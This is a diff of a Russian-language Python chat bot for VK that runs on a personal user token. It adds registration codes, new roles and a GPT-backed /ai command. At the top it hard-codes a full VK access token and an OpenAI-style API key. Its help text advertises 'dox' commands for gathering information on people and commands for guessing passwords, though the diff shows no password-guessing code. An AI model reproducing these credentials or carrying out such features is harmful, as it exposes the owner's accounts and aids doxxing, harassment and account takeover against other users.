@@ -14,6 +14,7 @@ import io
 import math
 import sys
 import subprocess
+import secrets  # для генерации кодов
 
 # ================= КОНФИГУРАЦИЯ =================
 USER_TOKEN = 'vk1.a.-skjA_qahwjDiig9rqTCTv37LhrNZxdmNvpJpfU0CSMvz-glB0brCdw1VkLk6ZVLOYPsL7h5b7kYORIS5ga5NKHCNFKoRYgU1hV_RgWXjUqaFjl2M5d2i-lwtiGmGYRLV-pvf-6b7_27ztOgrRC67z2Fys0NNJcXtIlltt2tDVfUSe-X3uj5d_ilHghBh2LLxd2ae1INY5CesZwxG-nukQ'
@@ -25,11 +26,9 @@ DB_FILE = 'bot.db'
 IMAGES_DIR = 'images'
 
 # ===== НАСТРОЙКИ GPT API =====
-GPT_API_KEY = 'sk-tkn-5e9c49b5-5d22-4087-b950-4c399affbaf9'  # Вставьте сюда ваш ключ от OpenAI
+GPT_API_KEY = 'sk-RLbhraB12P6rLJjEFTZyjzzlLEOXbEKg'
 GPT_API_URL = "https://api.openai.com/v1/chat/completions"
-GPT_MODEL = "gpt-3.5-turbo"  # Можно изменить на "gpt-4" если есть доступ
-
-
+GPT_MODEL = "gpt-3.5-turbo"
 
 ANECDOTES = [
     "Штирлиц склонился над картой СССР. Его неудержимо рвало на родину.",
@@ -40,20 +39,15 @@ ANECDOTES = [
 ]
 # ================================================
 
-
-
 # Функция для обращения к GPT
 def ask_gpt(question, system_prompt="Вы - полезный ассистент в VK боте. Отвечайте кратко и по делу на русском языке."):
-    """Функция для обращения к GPT API"""
     if GPT_API_KEY == 'ВАШ_КЛЮЧ_OPENAI_API':
         return "❌ Ошибка: Не установлен API ключ GPT. Добавьте ваш ключ в переменную GPT_API_KEY"
-    
     try:
         headers = {
             "Authorization": f"Bearer {GPT_API_KEY}",
             "Content-Type": "application/json"
         }
-        
         payload = {
             "model": GPT_MODEL,
             "messages": [
@@ -63,9 +57,7 @@ def ask_gpt(question, system_prompt="Вы - полезный ассистент 
             "max_tokens": 500,
             "temperature": 0.7
         }
-        
         response = requests.post(GPT_API_URL, headers=headers, json=payload, timeout=30)
-        
         if response.status_code == 200:
             result = response.json()
             return result['choices'][0]['message']['content']
@@ -75,7 +67,6 @@ def ask_gpt(question, system_prompt="Вы - полезный ассистент 
             return "❌ Ошибка: Превышен лимит запросов. Попробуйте позже."
         else:
             return f"❌ Ошибка API: {response.status_code} - {response.text[:200]}"
-            
     except requests.exceptions.Timeout:
         return "❌ Ошибка: Время ожидания истекло. Попробуйте еще раз."
     except Exception as e:
@@ -86,12 +77,17 @@ vk_session = vk_api.VkApi(token=USER_TOKEN)
 vk = vk_session.get_api()
 longpoll = VkLongPoll(vk_session)
 
-# Получаем ID владельца токена
+# Владелец бота (независимо от токена)
+OWNER_ID = 1116380571
+ADMIN_IDS = [OWNER_ID]
+
+# ID владельца токена (для проверки, на чьей странице работает бот)
 try:
-    owner_info = vk.users.get()[0]
-    OWNER_ID = owner_info['id']
-except:
-    OWNER_ID = CREATOR_ID
+    token_owner_info = vk.users.get()[0]
+    TOKEN_OWNER_ID = token_owner_info['id']
+except Exception as e:
+    print(f"Не удалось получить информацию о владельце токена: {e}")
+    TOKEN_OWNER_ID = OWNER_ID
 
 # ================= БАЗА ДАННЫХ =================
 conn = sqlite3.connect(DB_FILE, check_same_thread=False)
@@ -140,6 +136,13 @@ def init_db():
     CREATE TABLE IF NOT EXISTS custom_shab (
         name TEXT PRIMARY KEY
     );
+    CREATE TABLE IF NOT EXISTS reg_codes (
+        code TEXT PRIMARY KEY,
+        role INTEGER DEFAULT 0,
+        uses INTEGER DEFAULT 1,
+        created_by INTEGER,
+        created_at REAL
+    );
     ''')
     conn.commit()
 
@@ -151,7 +154,7 @@ def db_get_user(user_id):
 
 def db_create_user(user_id, access_token=None):
     if not db_get_user(user_id):
-        role = 3 if user_id in ADMIN_IDS else 0
+        role = 5 if user_id in ADMIN_IDS else 0   # создатель получает роль 5
         cursor.execute('INSERT INTO users (user_id, access_token, role, registered_at) VALUES (?,?,?,?)',
                        (user_id, access_token, role, time.time()))
         conn.commit()
@@ -164,8 +167,11 @@ def db_update_user(user_id, **kwargs):
 
 def db_get_trusted(user_id):
     row = db_get_user(user_id)
-    if row:
-        return json.loads(row[12])
+    if row and row[12]:
+        try:
+            return json.loads(row[12])
+        except:
+            return []
     return []
 
 def db_add_trusted(user_id, trusted_id):
@@ -201,13 +207,25 @@ def is_user_disabled(user_id):
         return row[14] == 1
     return False
 
+def generate_reg_code(role=0, uses=1, creator_id=None):
+    """Генерирует уникальный код регистрации и сохраняет в БД."""
+    code = secrets.token_hex(4).upper()  # 8 символов
+    cursor.execute('INSERT INTO reg_codes (code, role, uses, created_by, created_at) VALUES (?,?,?,?,?)',
+                   (code, role, uses, creator_id, time.time()))
+    conn.commit()
+    return code
+
 # ================= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =================
 def is_creator(user_id):
-    return user_id in ADMIN_IDS
+    return user_id in ADMIN_IDS or get_role(user_id) >= 5
 
 def get_role(user_id):
     row = db_get_user(user_id)
     return row[2] if row else 0
+
+def is_admin(user_id):
+    # роль 4 (Админ) и выше
+    return user_id in ADMIN_IDS or get_role(user_id) >= 4
 
 def is_emperor(user_id):
     return user_id in ADMIN_IDS or get_role(user_id) >= 3
@@ -218,19 +236,32 @@ def is_prince(user_id):
 def is_elite(user_id):
     return user_id in ADMIN_IDS or get_role(user_id) >= 1
 
-def is_admin(user_id):
-    return is_prince(user_id)
+def get_reply_message(event):
+    """Безопасно получаем reply_message из события."""
+    return getattr(event, 'reply_message', None)
 
-def parse_target_id(event):
-    if event.reply_message:
-        return event.reply_message['from_id']
-    match = re.search(r'\[id(\d+)\|', event.text)
+def get_target_and_clean_args(event, args):
+    """
+    Возвращает (target_id, new_args).
+    Если цель указана через ответ на сообщение, new_args = args.
+    Если цель указана в тексте (упоминание), она удаляется из args.
+    Если цель не указана, возвращает (None, args).
+    """
+    reply_msg = get_reply_message(event)
+    if reply_msg:
+        return reply_msg['from_id'], args
+    text = event.text
+    match = re.search(r'\[id(\d+)\|', text)
     if match:
-        return int(match.group(1))
-    match = re.search(r'@id(\d+)', event.text)
+        target_id = int(match.group(1))
+        new_args = [arg for arg in args if not re.search(r'\[id\d+\|', arg) and not re.search(r'@id\d+', arg)]
+        return target_id, new_args
+    match = re.search(r'@id(\d+)', text)
     if match:
-        return int(match.group(1))
-    return None
+        target_id = int(match.group(1))
+        new_args = [arg for arg in args if not re.search(r'\[id\d+\|', arg) and not re.search(r'@id\d+', arg)]
+        return target_id, new_args
+    return None, args
 
 def check_cooldown(user_id, action, cooldown_seconds):
     row = db_get_user(user_id)
@@ -318,80 +349,126 @@ def process_command(event):
 
     user_id = event.user_id
 
+    if TOKEN_OWNER_ID != OWNER_ID and user_id != OWNER_ID:
+        return
+
+    row = db_get_user(user_id)
+    if not row:
+        if user_id == OWNER_ID:
+            db_create_user(user_id)
+        elif command == 'reg':
+            if len(args) >= 1:
+                reg_code = args[0]
+                cursor.execute('SELECT role, uses FROM reg_codes WHERE code=?', (reg_code,))
+                code_row = cursor.fetchone()
+                if code_row:
+                    role = code_row[0]
+                    uses = code_row[1]
+                    db_create_user(user_id)
+                    if user_id not in ADMIN_IDS:
+                        db_update_user(user_id, role=role)
+                    if uses > 1:
+                        cursor.execute('UPDATE reg_codes SET uses=? WHERE code=?', (uses-1, reg_code))
+                        conn.commit()
+                    else:
+                        cursor.execute('DELETE FROM reg_codes WHERE code=?', (reg_code,))
+                        conn.commit()
+                    send_message(event.peer_id, f"✅ Регистрация прошла успешно! Ваша роль: {role}")
+                else:
+                    send_message(event.peer_id, "❌ Неверный код регистрации.")
+            else:
+                send_message(event.peer_id, "Использование: /reg (код)")
+            return
+        else:
+            return
+
     if is_user_disabled(user_id) and not is_creator(user_id):
         send_message(event.peer_id, "⛔ Ваш доступ к боту отключён создателем.")
         return
 
-    db_create_user(user_id)
-
     # ===== ОБЩИЕ КОМАНДЫ =====
     if command == 'help':
         help_text = """
-        Список команд:
-        /help — это сообщение
-        /dox (ссылка или ответ) — открытая информация о человеке
-        /doxelp (ссылка или ответ) — закрытая информация (админы)
-        /стат (ссылка или ответ) — профиль в боте
-        /казино (ставка) (количество) — игра на бтс
-        /выдатьбтс (ссылка/ответ) (кол-во) — выдать бтс (админы)
-        /герцог — купить подписку Герцог
-        /выдгерцог (ссылка/ответ) — выдать Герцога (админы)
-        /дофамин — получить дофамин (кулдаун 1-4 раза в час)
-        /украстьдоф (ссылка/ответ) — украсть дофамин (кулдаун 1-3 раза в час)
-        /защитадоф — купить защиту от кражи (500 бтс)
-        /выдзащита (ссылка/ответ) — выдать защиту (админы)
-        /стикеры (ссылка/ответ) — посмотреть стикеры игрока
-        /sp (ссылка/ответ) — добавить в доверенность
-        /unsp (ссылка/ответ) — убрать из доверенности
-        /vls (ссылка/ответ) — отправить сообщение в ЛС
-        /ai (запрос) — спросить ИИ
-        /cc (ссылка) — сократить ссылку
-        /+гс (название) — добавить гс
-        /гсы — список гс
-        /-гс (название) — удалить гс
-        /+шаб (название)
-        /шаблоны — список шаблонов
-        /-шаб (название)
-        /подбор (0-10) — подбор паролей
-        /+invite — пригласить друзей в чат
-        /-invite — остановить приглашение
-        /password — подбор пароля
-        /погода (город) — погода
-        /шар (вопрос) — магический шар
-        /+описание (текст) — сменить статус VK
-        /аватарка (ссылка/ответ) — отправить аватар
-        /-смс (ссылка/ответ) (кол-во) — удалить сообщения
-        /цитата (фото+текст) — создать цитату
-        /демо (текст) — демотиватор
-        /пинг — проверка
-        /тян — фото тянки
-        /ножки — фото ножек
-        /анекдот — случайный анекдот
-        /префикс (префикс) — сменить префикс
-        /+роль (0-3) (ссылка/ответ) — выдать роль (создатель)
-        /-роль (ссылка/ответ) — забрать роль (создатель)
-        /стафф — список персонала
-        /доступы — список с доступом к -смс
-        /+доступ (ссылка/ответ) — выдать доступ к -смс
-        /-доступ (ссылка/ответ) — забрать доступ
-        /добавить (ссылка/ответ) — добавить в беседу
-        /кик (ссылка/ответ) — кикнуть из беседы
-        /реши (пример) — решить пример
-        /чистка (кол-во) — удалить свои сообщения
-        /приз — получить бтс (раз в 2 часа)
-        /helpr1 — команды ранга Элита
-        /helpr2 — команды ранга Князь
-        /helpr3 — команды ранга Император
-        /reg (токен) — зарегистрировать свой токен
-        
-        🔧 Команды разработчика:
-        /restart — перезапустить бота (только разработчика)
-        /stop — остановить бота (только разработчика)
-        /сброс (токен/ID) — сбросить токен пользователя (только разработчика)
-        /отключение (ссылка/ответ) — отключить пользователя от бота (только разработчика)
-        /включение (ссылка/ответ) — включить пользователя обратно (только разработчика)
-        /токен инфа (токен) — информация о токене (только разработчика)
-        """
+📋 Список команд:
+👤 /dox — открытая информация о человеке
+🕵️ /doxelp — закрытая информация (Князь+)
+📊 /стат — профиль в боте
+🎰 /казино (ставка) (количество) — игра на БТС
+💰 /выдатьбтс (ссылка/ответ) (кол-во) — выдать БТС (Админ+)
+👑 /герцог — купить подписку Герцог
+🎁 /выдгерцог — выдать Герцога (Админ+)
+🧪 /дофамин — получить дофамин
+🤫 /украстьдоф — украсть дофамин
+🛡️ /защитадоф — купить защиту от кражи (500 БТС)
+🖼️ /стикеры — посмотреть стикеры игрока
+📨 /sp — добавить в доверенность
+🚫 /unsp — убрать из доверенности
+📩 /vls — отправить сообщение в ЛС
+🤖 /ai (запрос) — спросить ИИ
+🔗 /cc (ссылка) — сократить ссылку
+➕ /+гс (название) — добавить ГС
+📃 /гсы — список ГС
+➖ /-гс (название) — удалить ГС
+➕ /+шаб (название) — добавить шаблон
+📃 /шаблоны — список шаблонов
+➖ /-шаб (название) — удалить шаблон
+🔐 /подбор (0-10) — подбор паролей
+📲 /+invite — пригласить друзей в чат
+🛑 /-invite — остановить приглашение
+🔑 /password — подбор пароля
+🌤️ /погода (город) — погода
+🎱 /шар (вопрос) — магический шар
+📝 /+описание (текст) — сменить статус VK
+🖼️ /аватарка — отправить аватар
+🗑️ /-смс (ссылка/ответ) (кол-во) — удалить сообщения
+💬 /цитата (фото+текст) — создать цитату
+🖤 /демо (текст) — демотиватор
+🏓 /пинг — проверка
+🌸 /тян — фото тянки
+🦵 /ножки — фото ножек
+🖼️ /пикча — случайное фото из папки images/gort
+😄 /анекдот — случайный анекдот
+🔧 /префикс (префикс) — сменить префикс
+⭐ /+роль (0-4) — выдать роль (только Создатель)
+❌ /-роль — забрать роль (только Создатель)
+👥 /стафф — список персонала
+🔐 /доступы — список с доступом к -смс
+➕ /+доступ — выдать доступ к -смс (Князь+)
+➖ /-доступ — забрать доступ (Князь+)
+➕ /добавить — добавить в беседу
+👢 /кик — кикнуть из беседы
+🧮 /реши (пример) — решить пример
+🧹 /чистка (кол-во) — удалить свои сообщения
+🎁 /приз — получить БТС (раз в 2 часа)
+📖 /helpr1 — команды ранга Элита
+📖 /helpr2 — команды ранга Князь
+📖 /helpr3 — команды ранга Император
+🔑 /reg (код) — регистрация по коду
+🔑 /reg (токен) — сохранить токен (для зарегистрированных)
+🔑 /rcode [роль] [кол-во] — создать код регистрации (Админ+)
+📋 /codes — список активных кодов (Админ+)
+
+🛒 /starshop — магазин за звёзды
+🛒 /buy — купить товар (например: /buy бтс 100)
+
+🏆 /топбтс — топ по БТС
+🧪 /топдоф — топ по дофамину
+👑 /герцоги — список обладателей Герцога
+🛡️ /защищённые — список защищённых пользователей
+
+🔧 Команды разработчика (Админ+):
+🔄 /restart — перезапустить бота
+🛑 /stop — остановить бота
+🗑️ /сброс (токен/ID) — сбросить токен пользователя
+🔍 /токен инфа (токен) — информация о токене
+
+🔧 Только для Создателя:
+📋 /базаданных — список всех зарегистрированных пользователей
+⛔ /отключение — отключить пользователя от бота
+✅ /включение — включить пользователя обратно
+➕ /+админ — назначить администратора
+➖ /-админ — снять администратора
+"""
         send_message(event.peer_id, help_text)
 
     elif command == 'reg':
@@ -402,8 +479,48 @@ def process_command(event):
         else:
             send_message(event.peer_id, "Использование: /reg (токен)")
 
+    elif command == 'rcode':
+        if not is_admin(user_id):
+            send_message(event.peer_id, "⛔ Недостаточно прав. Требуется роль Админ или выше.")
+            return
+        role = 0
+        uses = 1
+        if args:
+            try:
+                role = int(args[0])
+                if role not in (0, 1, 2, 3, 4):
+                    raise ValueError
+            except:
+                send_message(event.peer_id, "Роль должна быть 0,1,2,3,4.")
+                return
+        if len(args) >= 2:
+            try:
+                uses = int(args[1])
+                if uses < 1:
+                    raise ValueError
+            except:
+                send_message(event.peer_id, "Количество использований должно быть положительным числом.")
+                return
+        code = generate_reg_code(role, uses, user_id)
+        send_message(event.peer_id, f"✅ Создан код регистрации: {code}\nРоль: {role}, использований: {uses}")
+
+    elif command == 'codes':
+        if not is_admin(user_id):
+            send_message(event.peer_id, "⛔ Недостаточно прав. Требуется роль Админ или выше.")
+            return
+        cursor.execute('SELECT code, role, uses, created_by, created_at FROM reg_codes')
+        rows = cursor.fetchall()
+        if rows:
+            message = "Активные коды регистрации:\n"
+            for r in rows:
+                message += f"Код: {r[0]}, Роль: {r[1]}, Осталось: {r[2]}, Создал: {r[3]}\n"
+            send_message(event.peer_id, message)
+        else:
+            send_message(event.peer_id, "Нет активных кодов.")
+
     elif command == 'dox':
-        target_id = parse_target_id(event) or user_id
+        target_id, _ = get_target_and_clean_args(event, args)
+        target_id = target_id or user_id
         info = get_user_info(target_id)
         if info:
             counters = info.get('counters', {})
@@ -423,18 +540,20 @@ def process_command(event):
             send_message(event.peer_id, "Не удалось получить информацию.")
 
     elif command == 'doxelp':
-        if not is_admin(user_id):
+        if not is_prince(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        target_id = parse_target_id(event) or user_id
+        target_id, _ = get_target_and_clean_args(event, args)
+        target_id = target_id or user_id
         send_message(event.peer_id, f"Закрытая информация о пользователе {target_id}:\nEmail: скрыт (нет доступа)\nСоцсети: не найдены")
 
     elif command == 'стат':
-        target_id = parse_target_id(event) or user_id
+        target_id, _ = get_target_and_clean_args(event, args)
+        target_id = target_id or user_id
         row = db_get_user(target_id)
         if row:
             reg_time = datetime.datetime.fromtimestamp(row[7]).strftime('%Y-%m-%d %H:%M') if row[7] else 'неизвестно'
-            role_names = {0: 'Обычный', 1: 'Элита', 2: 'Князь', 3: 'Император'}
+            role_names = {0: 'Участник', 1: 'Элита', 2: 'Князь', 3: 'Император', 4: 'Админ', 5: 'Создатель'}
             role = role_names.get(row[2], 'Неизвестно')
             disabled = '🔴 Отключён' if row[14] else '✅ Активен'
             message = f"📊 Профиль пользователя {target_id}:\n"
@@ -444,6 +563,7 @@ def process_command(event):
             message += f"Герцог: {'Да' if row[5] else 'Нет'}\n"
             message += f"Защита: {'Да' if row[6] else 'Нет'}\n"
             message += f"Роль: {role}\n"
+            message += f"Звёзды: {row[11]}\n"
             message += f"Статус: {disabled}"
             send_message(event.peer_id, message)
         else:
@@ -482,15 +602,15 @@ def process_command(event):
         if not is_admin(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        if len(args) < 2:
-            send_message(event.peer_id, "Использование: /выдатьбтс (ссылка/ответ) (количество)")
-            return
-        target_id = parse_target_id(event)
+        target_id, cleaned_args = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя.")
             return
+        if not cleaned_args:
+            send_message(event.peer_id, "Укажите количество.")
+            return
         try:
-            amount = int(args[-1])
+            amount = int(cleaned_args[-1])
         except:
             send_message(event.peer_id, "Неверное количество.")
             return
@@ -515,7 +635,8 @@ def process_command(event):
         if not is_admin(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        target_id = parse_target_id(event) or user_id
+        target_id, _ = get_target_and_clean_args(event, args)
+        target_id = target_id or user_id
         db_create_user(target_id)
         db_update_user(target_id, herzog=1)
         send_message(event.peer_id, f"✅ Герцог выдан пользователю {target_id}.")
@@ -534,7 +655,7 @@ def process_command(event):
         if not check_cooldown(user_id, 'steal', 1200):
             send_message(event.peer_id, "Слишком часто. Попробуйте позже.")
             return
-        target_id = parse_target_id(event)
+        target_id, _ = get_target_and_clean_args(event, args)
         if not target_id or target_id == user_id:
             send_message(event.peer_id, "Укажите цель.")
             return
@@ -571,26 +692,37 @@ def process_command(event):
         if not is_admin(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        target_id = parse_target_id(event) or user_id
+        target_id, _ = get_target_and_clean_args(event, args)
+        target_id = target_id or user_id
         db_create_user(target_id)
         db_update_user(target_id, protection=1)
         send_message(event.peer_id, f"✅ Защита выдана пользователю {target_id}.")
 
     elif command == 'стикеры':
-        target_id = parse_target_id(event) or user_id
+        target_id, _ = get_target_and_clean_args(event, args)
+        target_id = target_id or user_id
         send_message(event.peer_id, f"У пользователя {target_id} много стикеров (заглушка).")
 
     elif command == 'sp':
-        if len(args) < 1:
+        if not args:
             send_message(event.peer_id, "Использование: /sp (сообщение) — отправить сообщение от имени бота")
             return
-        target_id = parse_target_id(event)
-        if not target_id:
+        target_id, cleaned_args = get_target_and_clean_args(event, args)
+        msg = ' '.join(cleaned_args)
+        if target_id:
+            if target_id not in db_get_trusted(user_id) and not is_prince(user_id):
+                send_message(event.peer_id, "⛔ Пользователь не в доверенности.")
+                return
+            try:
+                vk.messages.send(peer_id=target_id, message=msg, random_id=get_random_id())
+                send_message(event.peer_id, f"✅ Сообщение отправлено пользователю {target_id}.")
+            except Exception as e:
+                send_message(event.peer_id, f"❌ Не удалось отправить: {e}")
+        else:
             trusted = db_get_trusted(user_id)
             if not trusted:
                 send_message(event.peer_id, "У вас нет доверенных пользователей.")
                 return
-            msg = ' '.join(args)
             for trusted_id in trusted:
                 try:
                     vk.messages.send(peer_id=trusted_id, message=msg, random_id=get_random_id())
@@ -598,19 +730,9 @@ def process_command(event):
                 except:
                     continue
             send_message(event.peer_id, f"✅ Сообщение отправлено {len(trusted)} доверенным пользователям.")
-        else:
-            if target_id not in db_get_trusted(user_id) and not is_admin(user_id):
-                send_message(event.peer_id, "⛔ Пользователь не в доверенности.")
-                return
-            msg = ' '.join(args)
-            try:
-                vk.messages.send(peer_id=target_id, message=msg, random_id=get_random_id())
-                send_message(event.peer_id, f"✅ Сообщение отправлено пользователю {target_id}.")
-            except Exception as e:
-                send_message(event.peer_id, f"❌ Не удалось отправить: {e}")
 
     elif command == 'unsp':
-        target_id = parse_target_id(event)
+        target_id, _ = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя.")
             return
@@ -618,11 +740,11 @@ def process_command(event):
         send_message(event.peer_id, f"✅ Пользователь {target_id} убран из доверенности.")
 
     elif command == 'vls':
-        target_id = parse_target_id(event)
+        target_id, _ = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя.")
             return
-        if target_id not in db_get_trusted(user_id) and not is_admin(user_id):
+        if target_id not in db_get_trusted(user_id) and not is_prince(user_id):
             send_message(event.peer_id, "⛔ Пользователь не в доверенности.")
             return
         try:
@@ -636,7 +758,8 @@ def process_command(event):
         if not query:
             send_message(event.peer_id, "Введите запрос.")
             return
-        send_message(event.peer_id, f"Ответ ИИ: Вы спросили: {query}. Это заглушка, замените на реальный API.")
+        answer = ask_gpt(query)
+        send_message(event.peer_id, answer)
 
     elif command == 'cc':
         if not args:
@@ -774,7 +897,8 @@ def process_command(event):
             send_message(event.peer_id, f"Ошибка: {e}")
 
     elif command == 'аватарка':
-        target_id = parse_target_id(event) or user_id
+        target_id, _ = get_target_and_clean_args(event, args)
+        target_id = target_id or user_id
         url = get_user_avatar(target_id)
         if url:
             send_message(event.peer_id, attachment=url)
@@ -782,20 +906,20 @@ def process_command(event):
             send_message(event.peer_id, "Не удалось получить аватар.")
 
     elif command == '-смс':
-        if not is_admin(user_id) and user_id not in get_access_users():
+        if not is_prince(user_id) and user_id not in get_access_users():
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        target_id = parse_target_id(event)
+        target_id, cleaned_args = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя.")
             return
-        if len(args) < 1:
-            count = 1
-        else:
+        if cleaned_args:
             try:
-                count = int(args[-1])
+                count = int(cleaned_args[-1])
             except:
                 count = 1
+        else:
+            count = 1
         try:
             messages = vk.messages.getHistory(peer_id=event.peer_id, count=200)['items']
             deleted = 0
@@ -810,8 +934,9 @@ def process_command(event):
 
     elif command == 'цитата':
         photo_url = None
-        if event.reply_message and 'attachments' in event.reply_message:
-            for att in event.reply_message['attachments']:
+        reply_msg = get_reply_message(event)
+        if reply_msg and 'attachments' in reply_msg:
+            for att in reply_msg['attachments']:
                 if att['type'] == 'photo':
                     photo_url = att['photo']['sizes'][-1]['url']
         if not photo_url:
@@ -866,23 +991,16 @@ def process_command(event):
         send_message(event.peer_id, "Понг!")
 
     elif command == 'пикча':
-        if os.path.isdir(IMAGES_DIR):
-            photos = []
-            for root, dirs, files in os.walk(IMAGES_DIR):
-                for file in files:
-                    if file.endswith(('.jpg', '.png', '.jpeg', '.gif')):
-                        photos.append(os.path.join(root, file))
-            if photos:
-                photo_path = random.choice(photos)
-                attachment = upload_photo_to_vk(event.peer_id, photo_path)
-                if attachment:
-                    send_message(event.peer_id, attachment=attachment)
-                else:
-                    send_message(event.peer_id, "Не удалось загрузить фото.")
+        folder = os.path.join(IMAGES_DIR, 'gort')
+        photo_path = get_random_image(folder)
+        if photo_path:
+            attachment = upload_photo_to_vk(event.peer_id, photo_path)
+            if attachment:
+                send_message(event.peer_id, attachment=attachment)
             else:
-                send_message(event.peer_id, "В папке images нет фото.")
+                send_message(event.peer_id, "Не удалось загрузить фото.")
         else:
-            send_message(event.peer_id, "Папка images не найдена. Создайте папку images и поместите туда фото.")
+            send_message(event.peer_id, "Папка images/gort не найдена или пуста.")
 
     elif command == 'тян':
         folder = os.path.join(IMAGES_DIR, 'tyan')
@@ -926,19 +1044,19 @@ def process_command(event):
         if not is_creator(user_id):
             send_message(event.peer_id, "⛔ Только создатель может выдавать роли.")
             return
-        if len(args) < 1:
-            send_message(event.peer_id, "Использование: /+роль (0-3) (ссылка/ответ)")
-            return
-        try:
-            role = int(args[0])
-            if role not in (0, 1, 2, 3):
-                raise ValueError
-        except:
-            send_message(event.peer_id, "Роль должна быть 0,1,2,3.")
-            return
-        target_id = parse_target_id(event)
+        target_id, cleaned_args = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя.")
+            return
+        if not cleaned_args:
+            send_message(event.peer_id, "Использование: /+роль (0-4) (ссылка/ответ)")
+            return
+        try:
+            role = int(cleaned_args[0])
+            if role not in (0, 1, 2, 3, 4):
+                raise ValueError
+        except:
+            send_message(event.peer_id, "Роль должна быть 0,1,2,3,4.")
             return
         db_create_user(target_id)
         db_update_user(target_id, role=role)
@@ -948,7 +1066,7 @@ def process_command(event):
         if not is_creator(user_id):
             send_message(event.peer_id, "⛔ Только создатель может забирать роли.")
             return
-        target_id = parse_target_id(event)
+        target_id, _ = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя.")
             return
@@ -962,7 +1080,7 @@ def process_command(event):
         if rows:
             message = "Персонал:\n"
             for r in rows:
-                role_names = {1: 'Элита', 2: 'Князь', 3: 'Император'}
+                role_names = {1: 'Элита', 2: 'Князь', 3: 'Император', 4: 'Админ', 5: 'Создатель'}
                 message += f"ID {r[0]} — {role_names.get(r[1], '?')}\n"
             send_message(event.peer_id, message)
         else:
@@ -976,10 +1094,10 @@ def process_command(event):
             send_message(event.peer_id, "Список пуст.")
 
     elif command == '+доступ':
-        if not is_admin(user_id):
+        if not is_prince(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        target_id = parse_target_id(event)
+        target_id, _ = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя.")
             return
@@ -988,10 +1106,10 @@ def process_command(event):
         send_message(event.peer_id, f"✅ Доступ выдан пользователю {target_id}.")
 
     elif command == '-доступ':
-        if not is_admin(user_id):
+        if not is_prince(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        target_id = parse_target_id(event)
+        target_id, _ = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя.")
             return
@@ -1003,7 +1121,7 @@ def process_command(event):
         if not event.from_chat:
             send_message(event.peer_id, "Команда доступна только в беседе.")
             return
-        target_id = parse_target_id(event)
+        target_id, _ = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя.")
             return
@@ -1017,7 +1135,7 @@ def process_command(event):
         if not event.from_chat:
             send_message(event.peer_id, "Команда доступна только в беседе.")
             return
-        target_id = parse_target_id(event)
+        target_id, _ = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя.")
             return
@@ -1087,7 +1205,8 @@ def process_command(event):
         if not is_elite(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        target_id = parse_target_id(event) or user_id
+        target_id, _ = get_target_and_clean_args(event, args)
+        target_id = target_id or user_id
         row = db_get_user(target_id)
         if row:
             send_message(event.peer_id, f"Профиль {target_id}: БТС={row[3]}, Дофамин={row[4]}, Роль={row[2]}")
@@ -1098,7 +1217,8 @@ def process_command(event):
         if not is_elite(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        target_id = parse_target_id(event) or user_id
+        target_id, _ = get_target_and_clean_args(event, args)
+        target_id = target_id or user_id
         cursor.execute('SELECT action, timestamp FROM history WHERE user_id=?', (target_id,))
         rows = cursor.fetchall()
         if rows:
@@ -1113,7 +1233,8 @@ def process_command(event):
         if not is_elite(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        target_id = parse_target_id(event) or user_id
+        target_id, _ = get_target_and_clean_args(event, args)
+        target_id = target_id or user_id
         cursor.execute('SELECT reason, expires_at, banned_by FROM bans WHERE user_id=?', (target_id,))
         row = cursor.fetchone()
         if row:
@@ -1142,10 +1263,8 @@ def process_command(event):
             send_message(event.peer_id, """
             Команды ранга Князь:
             /block (пользователь) (0-15) (причина)
-            /unblock (пользователь)
             /выдатьзащита (пользователь)
             /starshop
-            /забратьак (пользователь)
             /block (пользователь) (0-60) (причина)
             """)
         else:
@@ -1155,19 +1274,20 @@ def process_command(event):
         if not is_prince(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        if len(args) < 2:
-            send_message(event.peer_id, "Использование: /block (пользователь) (срок в минутах или -1 для вечного) (причина)")
-            return
-        target_id = parse_target_id(event)
+        target_id, cleaned_args = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя.")
             return
+        if not cleaned_args:
+            send_message(event.peer_id, "Укажите срок.")
+            return
+        duration_str = cleaned_args[0]
+        reason = ' '.join(cleaned_args[1:]) if len(cleaned_args) > 1 else 'Без причины'
         try:
-            duration = int(args[0])
+            duration = int(duration_str)
         except:
             send_message(event.peer_id, "Неверный срок.")
             return
-        reason = ' '.join(args[1:]) if len(args) > 1 else 'Без причины'
         expires = time.time() + duration * 60 if duration != -1 else None
         cursor.execute('INSERT OR REPLACE INTO bans (user_id, reason, expires_at, banned_by) VALUES (?,?,?,?)',
                        (target_id, reason, expires, user_id))
@@ -1178,10 +1298,10 @@ def process_command(event):
         send_message(event.peer_id, f"✅ Пользователь {target_id} заблокирован на {duration} минут.")
 
     elif command == 'unblock':
-        if not is_prince(user_id):
+        if not is_admin(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        target_id = parse_target_id(event)
+        target_id, _ = get_target_and_clean_args(event, args)
         if not target_id:
